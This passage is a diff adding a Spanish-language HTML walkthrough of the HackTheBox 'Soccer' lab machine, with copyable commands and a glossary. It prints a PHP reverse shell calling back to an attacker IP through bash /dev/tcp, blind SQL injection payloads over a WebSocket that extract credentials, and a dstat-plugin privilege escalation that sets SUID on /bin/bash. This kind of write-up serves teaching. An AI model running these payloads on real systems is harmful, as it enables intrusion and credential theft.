+        <div class="cred-item"><div class="cred-label">CONTRASEÑA</div><div class="cred-val">admin@123</div></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ACCESO CONFIRMADO</p>
+        <p>Con estas credenciales se obtiene acceso completo al explorador de archivos en <strong>tinyfilemanager.php?p=</strong>, incluyendo subida de archivos.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- FOOTHOLD -->
+    <div class="section" id="foothold">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Foothold — CVE-2021-45010</h2>
+      <div class="section-line"></div>
+
+      <div class="cve-box">
+        <p class="cve-box-title">// CVE-2021-45010</p>
+        <p>Tiny File Manager &lt;= 2.4.3 permite a un usuario autenticado subir archivos sin restricción de extensión, incluyendo <strong>.php</strong>, lo que resulta en ejecución remota de código sobre el servidor.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">SUBIDA DE WEBSHELL</span>
+      </div>
+      <div class="prose">
+        <p>Se navega a la carpeta de uploads dentro del explorador y se prepara una reverse shell en PHP:</p>
+      </div>
+
+      <div class="cmd-block" data-cmd="http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads&upload">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">URL</span>
+        <div><span class="prompt">$ </span><span class="cmd">http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads&amp;upload</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>&lt;?php</div>
+        <div>exec(<span class="o-yellow">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.7/443 0&gt;&amp;1'"</span>);</div>
+        <div>?&gt;</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">LISTENER Y EJECUCIÓN</span>
+      </div>
+      <div class="prose">
+        <p>Se sube el archivo como <code style="color:var(--yellow)">revershell.php</code> y se deja un listener en Kali antes de invocar el archivo desde el navegador:</p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nc -lvnp 443">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NETCAT</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nc <span class="flag">-lvnp</span> <span class="arg">443</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>listening on [any] 443 ...</div>
+        <div><span class="o-green">connect to [10.10.16.7] from (UNKNOWN) [10.129.4.0] 50898</span></div>
+        <div>www-data@soccer:~/html/tiny/uploads$</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// FOOTHOLD CONFIRMADO</p>
+        <p>Al visitar <strong>/tiny/uploads/revershell.php</strong> desde el navegador, el archivo se ejecuta en el servidor y se recibe la conexión como <strong>www-data</strong>.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- PIVOTE -->
+    <div class="section" id="pivote">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Pivote — Descubrimiento del vhost</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">CONFIGURACIONES DE NGINX</span>
+      </div>
+      <div class="prose">
+        <p>Dentro del sistema, se buscan archivos de configuración de Nginx que puedan revelar otros sitios alojados internamente:</p>
+      </div>
+
+      <div class="cmd-block" data-cmd='find / -type d -name "nginx" 2>/dev/null'>
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">FIND</span>
+        <div><span class="prompt">$ </span><span class="cmd">find / <span class="flag">-type d -name</span> <span class="arg">"nginx"</span> 2&gt;/dev/null</span></div>
+      </div>
+
+      <div class="cmd-block" data-cmd="cat /etc/nginx/sites-available/soc-player.htb">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">CAT</span>
+        <div><span class="prompt">$ </span><span class="cmd">cat <span class="arg">/etc/nginx/sites-available/soc-player.htb</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>server {</div>
+        <div>&nbsp;&nbsp;&nbsp;server_name <span class="o-cyan">soc-player.soccer.htb</span>;</div>
+        <div>&nbsp;&nbsp;&nbsp;root /root/app/views;</div>
+        <div>&nbsp;&nbsp;&nbsp;location / {</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proxy_pass <span class="o-green">http://localhost:3000</span>;</div>
+        <div>&nbsp;&nbsp;&nbsp;}</div>
+        <div>}</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">ENUMERACIÓN DEL NUEVO VHOST</span>
+      </div>
+      <div class="prose">
+        <p>Se agrega el nuevo subdominio al <code style="color:var(--yellow)">/etc/hosts</code> local y se fuzzea con parámetros ajustados para evitar falsos positivos por redirecciones 302:</p>
+      </div>
+
+      <div class="cmd-block" data-cmd="echo '10.129.4.0    soccer.htb soc-player.soccer.htb' | sudo tee -a /etc/hosts">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">HOSTS</span>
+        <div><span class="prompt">$ </span><span class="cmd">echo <span class="arg">'10.129.4.0    soccer.htb soc-player.soccer.htb'</span> | sudo tee -a /etc/hosts</span></div>
+      </div>
+
+      <div class="cmd-block" data-cmd="feroxbuster -u http://soc-player.soccer.htb/ -C 302 -N 50 -W 200 -S 2000">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">FEROXBUSTER</span>
+        <div><span class="prompt">$ </span><span class="cmd">feroxbuster <span class="flag">-u</span> <span class="arg">http://soc-player.soccer.htb/</span> <span class="flag">-C 302 -N 50 -W 200 -S 2000</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">200</span>   GET   http://soc-player.soccer.htb/login</div>
+        <div><span class="o-green">200</span>   GET   http://soc-player.soccer.htb/signup</div>
+        <div><span class="o-green">200</span>   GET   http://soc-player.soccer.htb/match</div>
+        <div><span class="o-green">200</span>   GET   http://soc-player.soccer.htb/check</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// HTB FOOTBALL CLUB</p>
+        <p>El sitio expone un sistema de venta de tickets para partidos. Tras registrarse en <strong>/signup</strong>, se obtiene acceso a <strong>/check</strong>, donde se valida el número de ticket.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- SQLi -->
+    <div class="section" id="sqli">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Blind SQL Injection vía WebSockets</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">IDENTIFICACIÓN DEL CANAL VULNERABLE</span>
+      </div>
+      <div class="prose">
+        <p>
+          El código fuente de <code style="color:var(--yellow)">/check</code> revela que la
+          validación del ticket no se hace por HTTP normal, sino mediante un
+          <strong>WebSocket</strong> abierto en el puerto 9091:
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div>var ws = new WebSocket(<span class="o-cyan">"ws://soc-player.soccer.htb:9091"</span>);</div>
+      </div>
+
+      <div class="prose">
+        <p>
+          El parámetro <code style="color:var(--yellow)">id</code> enviado por el socket es
+          vulnerable a <span class="hl-pur">inyección SQL ciega</span>. El oráculo es el mensaje de
+          error <em>"Ticket Doesn't Exist"</em>: si está presente, el carácter probado es incorrecto.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">11</div>
+        <span class="step-title">SCRIPT DE EXTRACCIÓN (PYTHON + PWNTOOLS)</span>
+      </div>
+      <div class="prose">
+        <p>Se automatiza la extracción carácter por carácter con un script que conecta al WebSocket y prueba cada posición con fuerza bruta:</p>
+      </div>
+
+      <div class="cmd-block" data-cmd='ws.connect("ws://soc-player.soccer.htb:9091/")'>
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PYTHON</span>
+        <div><span class="comment"># sqli.py — esqueleto de conexión</span></div>
+        <div><span class="cmd">import websocket, json, string</span></div>
+        <div><span class="cmd">characters = string.ascii_lowercase + <span class="arg">"-_,"</span></span></div>
+        <div><span class="cmd">ws = websocket.WebSocket()</span></div>
+        <div><span class="cmd">ws.connect(<span class="arg">"ws://soc-player.soccer.htb:9091/"</span>)</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">12</div>
+        <span class="step-title">ENUMERAR BASES DE DATOS</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="1 or substr((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PAYLOAD</span>
+        <div><span class="cmd">"id": "<span class="arg">1 or substr((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s'</span> " % (i, character)</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[<span class="o-green">o</span>] SQLI: Iniciando ataque de fuerza bruta</div>
+        <div>[<span class="o-cyan">-</span>] Database Name: <span class="o-green">mysql,information_schema,performance_schema,sys,soccer_db</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">13</div>
+        <span class="step-title">ENUMERAR TABLAS DE soccer_db</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="1 or substr((select group_concat(table_name) from information_schema.tables where table_schema='soccer_db'),%d,1)='%s'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PAYLOAD</span>
+        <div><span class="cmd">"id": "<span class="arg">1 or substr((select group_concat(table_name) from information_schema.tables where table_schema='soccer_db'),%d,1)='%s'</span> " % (i, character)</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[<span class="o-cyan">-</span>] Tables Name [soccer_db]: <span class="o-green">accounts</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">14</div>
+        <span class="step-title">ENUMERAR COLUMNAS DE accounts</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="1 or substr((select group_concat(column_name) from information_schema.columns where table_schema='soccer_db' and table_name='accounts'),%d,1)='%s'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PAYLOAD</span>
+        <div><span class="cmd">"id": "<span class="arg">1 or substr((select group_concat(column_name) from information_schema.columns where table_schema='soccer_db' and table_name='accounts'),%d,1)='%s'</span> " % (i, character)</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[<span class="o-cyan">-</span>] Columns Name [soccer_db]: <span class="o-green">id,email,username,password</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">15</div>
+        <span class="step-title">EXTRACCIÓN DE CREDENCIALES</span>
+      </div>
+      <div class="prose">
+        <p>Se amplía el set de caracteres permitidos para cubrir letras, dígitos y símbolos comunes en contraseñas, y se concatenan usuario y contraseña en una sola consulta:</p>
+      </div>
+
+      <div class="cmd-block" data-cmd="characters = string.ascii_letters + string.digits + &quot;-_,:@;!&quot;">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PYTHON</span>
+        <div><span class="cmd">characters = string.ascii_letters + string.digits + <span class="arg">"-_,:@;!"</span></span></div>
+        <div><span class="cmd">"id": "<span class="arg">1 or binary substr((select group_concat(username,':',password) from soccer_db.accounts),%d,1)='%s'</span> " % (i, character)</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[<span class="o-green">o</span>] SQLI: Iniciando ataque de fuerza bruta</div>
+        <div>[<span class="o-cyan">-</span>] Extracción [soccer_db]: <span class="o-red">player:PlayerOftheMatch2022</span></div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item"><div class="cred-label">USUARIO</div><div class="cred-val">player</div></div>
+        <div class="cred-item"><div class="cred-label">CONTRASEÑA</div><div class="cred-val">PlayerOftheMatch2022</div></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- USER -->
+    <div class="section" id="user">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Acceso como player</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">16</div>
+        <span class="step-title">REUTILIZACIÓN DE CREDENCIALES</span>
+      </div>
+      <div class="prose">
+        <p>
+          Las credenciales extraídas de la base de datos web también son válidas para el usuario
+          <span class="hl">player</span> del sistema operativo — un caso clásico de
+          <span class="hl-pur">password reuse</span>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="su player">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SU</span>
+        <div><span class="prompt">$ </span><span class="cmd">su <span class="arg">player</span></span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">17</div>
+        <span class="step-title">MEJORANDO LA TTY</span>
+      </div>
+      <div class="prose">
+        <p>Para tener una shell totalmente interactiva (autocompletado, Ctrl+C funcional, editores), se realiza el upgrade clásico de TTY:</p>
+      </div>
+
+      <div class="cmd-block" data-cmd='python3 -c &#39;import pty; pty.spawn("/bin/bash")&#39;'>
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PTY</span>
+        <div><span class="prompt">$ </span><span class="cmd">python3 <span class="flag">-c</span> <span class="arg">'import pty; pty.spawn("/bin/bash")'</span></span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// SECUENCIA COMPLETA</p>
+        <p>
+          1. En la shell remota: ejecutar el comando anterior, luego <strong>Ctrl+Z</strong><br>
+          2. En Kali: <code style="color:var(--yellow)">stty raw -echo; fg</code> y pulsar Enter dos veces<br>
+          3. En la shell remota: <code style="color:var(--yellow)">export TERM=xterm</code>,
+          <code style="color:var(--yellow)">export SHELL=/bin/bash</code>,
+          <code style="color:var(--yellow)">stty rows 50 columns 100</code>,
+          <code style="color:var(--yellow)">PS1='\u@\h:\w$ '</code>
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cat /home/player/user.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">FLAG</span>
+        <div><span class="prompt">$ </span><span class="cmd">cat <span class="arg">/home/player/user.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">127698292315b1fdd9c6f80da441ab5f</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- PRIVESC -->
+    <div class="section" id="privesc">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Escalada de privilegios</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">18</div>
+        <span class="step-title">BÚSQUEDA DE BINARIOS SUID</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="find / -perm -4000 -type f 2>/dev/null">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">FIND</span>
+        <div><span class="prompt">$ </span><span class="cmd">find / <span class="flag">-perm -4000 -type f</span> 2&gt;/dev/null</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-yellow">/usr/local/bin/doas</span></div>
+        <div>/usr/bin/su</div>
+        <div>/usr/bin/sudo</div>
+        <div>...</div>
+      </div>
+
+      <div class="prose">
+        <p>
+          <code style="color:var(--yellow)">doas</code> es una alternativa ligera a
+          <code style="color:var(--yellow)">sudo</code> originaria de OpenBSD. Se busca su archivo
+          de configuración:
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="find / -name doas.conf 2>/dev/null">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">FIND</span>
+        <div><span class="prompt">$ </span><span class="cmd">find / <span class="flag">-name</span> <span class="arg">doas.conf</span> 2&gt;/dev/null</span></div>
+      </div>
+
+      <div class="cmd-block" data-cmd="cat /usr/local/etc/doas.conf">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">CAT</span>
+        <div><span class="prompt">$ </span><span class="cmd">cat <span class="arg">/usr/local/etc/doas.conf</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-red">permit nopass player as root cmd /usr/bin/dstat</span></div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// REGLA PELIGROSA</p>
+        <p>El usuario <strong>player</strong> puede ejecutar <strong>dstat</strong> como <strong>root</strong> sin contraseña (<code>nopass</code>). dstat por sí solo no es peligroso — el problema es su soporte de plugins externos.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">19</div>
+        <span class="step-title">PLUGIN MALICIOSO PARA DSTAT (GTFOBINS)</span>
+      </div>
+      <div class="prose">
+        <p>
+          Según <a href="https://gtfobins.org/gtfobins/dstat/#inherit" target="_blank" style="color:var(--cyan)">GTFOBins</a>,
+          <code style="color:var(--yellow)">dstat</code> puede cargar plugins de Python ubicados en
+          rutas específicas, ejecutándolos con los mismos privilegios del proceso. Se verifica un
+          directorio escribible por <strong>player</strong>:
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ls -l /usr/local/share | grep dstat">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">LS</span>
+        <div><span class="prompt">$ </span><span class="cmd">ls <span class="flag">-l</span> /usr/local/share | grep <span class="arg">dstat</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>drwxrwx--- 2 root <span class="o-green">player</span> 4096 Dec 12  2022 dstat</div>
+      </div>
+
+      <div class="cmd-block" data-cmd="cat > /usr/local/share/dstat/dstat_evil.py << 'EOF'
+import os
+os.system('chmod +s /bin/bash')
+EOF">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PLUGIN</span>
+        <div><span class="prompt">$ </span><span class="cmd">cat &gt; /usr/local/share/dstat/dstat_evil.py &lt;&lt; <span class="arg">'EOF'</span></span></div>
+        <div><span class="cmd">import os</span></div>
+        <div><span class="cmd">os.system(<span class="arg">'chmod +s /bin/bash'</span>)</span></div>
+        <div><span class="cmd">EOF</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ROOT -->
+    <div class="section" id="flags">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">Root</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">20</div>
+        <span class="step-title">EJECUCIÓN DEL PLUGIN VÍA DOAS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Se invoca <code style="color:var(--yellow)">dstat</code> a través de
+          <code style="color:var(--yellow)">doas</code>, cargando el plugin
+          <code style="color:var(--yellow)">evil</code> (sin el sufijo <code>.py</code>):
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="/usr/local/bin/doas /usr/bin/dstat --evil">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">DOAS</span>
+        <div><span class="prompt">$ </span><span class="cmd">/usr/local/bin/doas /usr/bin/dstat <span class="flag">--evil</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Module dstat_evil failed to load. (name <span class="o-red">'dstat_plugin' is not defined</span>)</div>
+        <div>None of the stats you selected are available.</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// EL PLUGIN "FALLA" — PERO YA SE EJECUTÓ</p>
+        <p>dstat falla en cargar el plugin como un módulo de estadísticas válido, pero el efecto secundario de <strong>os.system()</strong> ya ocurrió como <strong>root</strong> antes de que fallara la carga. El bit SUID quedó activo en /bin/bash.</p>
+      </div>
+
+      <div class="cmd-block" data-cmd="/bin/bash -p">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SHELL</span>
+        <div><span class="prompt-root"># </span><span class="cmd">/bin/bash <span class="flag">-p</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>bash-5.0# whoami</div>
+        <div><span class="o-red">root</span></div>
+        <div>bash-5.0# cat /root/root.txt</div>
+        <div><span class="o-green">7e7cd69f31652f074464b1c21a6ba54d</span></div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item"><div class="cred-label">USER FLAG</div><div class="cred-val">127698292315b1fdd9c6f80da441ab5f</div></div>
+        <div class="cred-item"><div class="cred-label">ROOT FLAG</div><div class="cred-val">7e7cd69f31652f074464b1c21a6ba54d</div></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REFERENCIA -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 10</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">feroxbuster</div>
+          <div class="cmd-ref-syntax">feroxbuster -u &lt;url&gt; -C &lt;codes&gt;</div>
+          <div class="cmd-ref-desc">Fuzzer de directorios y archivos en Rust, rápido y con auto-filtrado de respuestas similares (wildcard).</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-C</span> — códigos de estado a filtrar/ignorar</li>
+            <li><span>-S</span> — filtra por tamaño de respuesta</li>
+            <li><span>-N</span> — número de resultados nuevos antes de auto-filtrar</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">doas</div>
+          <div class="cmd-ref-syntax">doas &lt;comando&gt;</div>
+          <div class="cmd-ref-desc">Alternativa minimalista a sudo, originaria de OpenBSD. Sus reglas se definen en doas.conf con sintaxis permit/deny.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>nopass</span> — permite ejecutar sin pedir contraseña</li>
+            <li><span>cmd</span> — restringe la regla a un binario específico</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">dstat</div>
+          <div class="cmd-ref-syntax">dstat --&lt;plugin_name&gt;</div>
+          <div class="cmd-ref-desc">Herramienta de monitoreo de recursos del sistema en tiempo real, sucesora de vmstat/iostat. Soporta plugins de Python cargados como módulos externos.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>plugins</span> — buscados en ~/.dstat/, /usr/share/dstat/, /usr/local/share/dstat/</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">websocket (Python)</div>
+          <div class="cmd-ref-syntax">ws.connect("ws://host:port")</div>
+          <div class="cmd-ref-desc">Librería Python para conectarse a servidores WebSocket, usada aquí para automatizar la extracción de datos mediante inyección SQL ciega.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>ws.send()</span> — envía el payload JSON</li>
+            <li><span>ws.recv()</span> — recibe la respuesta del servidor</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- GLOSARIO -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 11</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">Default Credentials (Credenciales por Defecto)</div>
+          <div class="glos-def">Son las credenciales preconfiguradas de fábrica en un software, documentadas públicamente por el propio desarrollador para facilitar la instalación inicial. El problema surge cuando el administrador nunca las cambia tras desplegar la aplicación, dejando una puerta de entrada trivial para cualquier atacante que conozca o busque esa documentación.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">CVE-2021-45010 — Tiny File Manager Arbitrary File Upload</div>
+          <div class="glos-def">Vulnerabilidad en <strong>Tiny File Manager &lt;= 2.4.3</strong> que permite a un usuario autenticado subir archivos sin validar su extensión. Al permitir subir un archivo <code>.php</code> dentro del webroot, un atacante puede ejecutar código arbitrario en el servidor simplemente visitando la URL del archivo subido.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">vhost — Virtual Host</div>
+          <div class="glos-def">Configuración de un servidor web (como Nginx o Apache) que permite alojar <strong>múltiples sitios independientes</strong> bajo una misma dirección IP, diferenciándolos por el nombre de dominio (<code>server_name</code>) enviado en la petición HTTP. Es habitual encontrar vhosts internos no listados en DNS público, descubribles solo revisando archivos de configuración del servidor.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Blind SQL Injection</div>
+          <div class="glos-def">Tipo de inyección SQL en la que la aplicación <strong>no devuelve directamente</strong> los datos extraídos de la base de datos. En su lugar, el atacante infiere información observando diferencias de comportamiento — un mensaje distinto, un cambio en el tiempo de respuesta, o un código de estado diferente — al variar la condición lógica inyectada (por ejemplo, <code>substr(...)='a'</code>, <code>='b'</code>, etc., carácter por carácter).</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">WebSocket</div>
+          <div class="glos-def">Protocolo de comunicación que establece un <strong>canal bidireccional persistente</strong> entre cliente y servidor sobre una única conexión TCP, a diferencia del modelo petición-respuesta de HTTP tradicional. Es común en aplicaciones en tiempo real (chats, notificaciones, dashboards). Al ser menos auditado por defecto que los endpoints HTTP, los parámetros enviados por WebSocket a veces escapan a las validaciones de seguridad estándar — como ocurre en esta máquina.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">information_schema</div>
+          <div class="glos-def">Base de datos especial presente en MySQL/MariaDB que contiene <strong>metadatos sobre todas las demás bases de datos</strong> del servidor: nombres de esquemas, tablas, columnas y tipos de datos. Es el primer objetivo de cualquier inyección SQL orientada a extracción de datos, ya que permite mapear la estructura completa antes de extraer contenido real.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Password Reuse (Reutilización de Contraseñas)</div>
+          <div class="glos-def">Práctica de usar la misma contraseña en múltiples cuentas o sistemas. En entornos comprometidos, es una de las técnicas de <strong>movimiento lateral</strong> más efectivas: credenciales extraídas de una base de datos web (capa de aplicación) frecuentemente coinciden con las del usuario del sistema operativo correspondiente, permitiendo escalar de un contexto a otro sin explotar nuevas vulnerabilidades.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">doas — Alternativa a sudo</div>
+          <div class="glos-def"><strong>doas</strong> es una utilidad minimalista originaria de OpenBSD, portada a Linux, que cumple la misma función que <code>sudo</code>: permitir ejecutar comandos con privilegios elevados según reglas definidas. Su archivo de configuración (<code>doas.conf</code>) usa una sintaxis simple de tipo <code>permit/deny</code>. Reglas mal definidas — como permitir un binario con funcionalidad extensible sin restricciones — pueden convertirse en una vía directa de escalada de privilegios.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">GTFOBins</div>
+          <div class="glos-def">Proyecto colaborativo que documenta binarios Unix legítimos que pueden ser abusados para <strong>evadir restricciones de seguridad locales</strong> — escalar privilegios, escapar de shells restringidas, leer o escribir archivos protegidos, entre otros. Es una referencia estándar al evaluar qué hacer con un binario SUID o una regla de sudo/doas inusual.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">SUID (Set User ID)</div>
+          <div class="glos-def">Bit especial de permisos en sistemas Unix/Linux que, al activarse en un binario ejecutable, hace que este se ejecute con los <strong>privilegios de su propietario</strong> (frecuentemente root) en lugar de los del usuario que lo invoca. Es la técnica final usada en esta máquina: forzar que <code>chmod +s /bin/bash</code> se ejecute como root, dejando una bash con privilegios elevados disponible para cualquier usuario.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Plugin de Python en dstat</div>
+          <div class="glos-def"><strong>dstat</strong> es una herramienta de monitoreo de recursos que soporta extender sus métricas mediante plugins de Python ubicados en directorios predefinidos (<code>~/.dstat/</code>, <code>/usr/share/dstat/</code>, <code>/usr/local/share/dstat/</code>). Si un usuario tiene permiso de escritura sobre alguno de esos directorios y, además, puede ejecutar dstat como root (vía doas o sudo), puede colocar un plugin con código Python arbitrario que se ejecutará con privilegios de root al ser invocado — incluso si el plugin "falla" como módulo de estadísticas.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">pwntools</div>
+          <div class="glos-def">Framework de Python orientado a <strong>explotación y CTFs</strong>, que provee utilidades como manejo de procesos remotos, logging con barras de progreso (<code>log.progress</code>), empaquetado de bytes, y manejo de señales. En esta máquina se usó principalmente para mostrar el progreso de la extracción de datos durante el ataque de fuerza bruta de la inyección SQL ciega.</div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
